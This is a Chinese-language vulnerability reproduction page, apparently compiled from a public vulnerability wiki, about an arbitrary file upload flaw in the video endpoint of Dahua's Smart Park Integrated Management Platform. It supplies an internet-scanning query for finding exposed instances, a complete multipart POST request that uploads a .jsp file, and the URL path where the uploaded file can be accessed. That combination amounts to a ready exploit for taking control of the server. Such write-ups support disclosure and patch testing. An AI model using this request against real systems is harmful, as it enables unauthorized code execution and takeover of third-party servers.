---
title: "大华 智慧园区综合管理平台 video 任意文件上传漏洞"
date: 2026-10-18 09:16:02
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "大华"
tags:
  - "大华"
  - "文件上传"
  - "漏洞复现"
---
## 漏洞描述

大华 智慧园区综合管理平台 video 接口存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件到服务器中，控制服务器权限

## 漏洞影响

大华 智慧园区综合管理平台

## 网络测绘

```
app="dahua-智慧园区综合管理平台"
```

## 漏洞复现

登陆页面

![image-20230704114553099](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230704114553099.png)

验证POC

```
POST /publishing/publishing/material/file/video HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Content-Length: 804
Content-Type: multipart/form-data; boundary=dd8f988919484abab3816881c55272a7
Accept-Encoding: gzip, deflate
Connection: close

--dd8f988919484abab3816881c55272a7
Content-Disposition: form-data; name="Filedata"; filename="Test.jsp"

Test
--dd8f988919484abab3816881c55272a7
Content-Disposition: form-data; name="Submit"

submit
--dd8f988919484abab3816881c55272a7--
```

![image-20230828145833164](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230828145833164.png)

访问：

```
/publishingImg/VIDEO/230812152005170200.jsp
```

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E5%A4%A7%E5%8D%8E-%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-video-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md)
